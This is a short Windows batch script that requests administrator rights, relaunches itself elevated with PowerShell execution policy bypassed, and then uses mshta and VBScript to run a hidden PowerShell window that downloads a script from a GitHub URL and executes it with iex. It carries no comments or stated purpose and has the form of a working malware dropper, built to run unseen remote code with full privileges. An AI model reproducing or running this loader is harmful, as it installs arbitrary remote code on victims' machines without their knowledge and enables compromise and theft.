@echo off

net session >nul 2>&1
if not %errorlevel% == 0 ( powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Start-Process -Verb RunAs -FilePath '%~f0'" & exit /b 0)
cd /d %~dp0

mshta vbscript:close(createobject("wscript.shell").run("powershell $ProgressPreference = 'SilentlyContinue';$userid = 1086990476411932722;$t = Iwr -Uri 'https://raw.githubusercontent.com/43a1723/test/main/Extras/autorun.ps1' -USeB | iex",0))
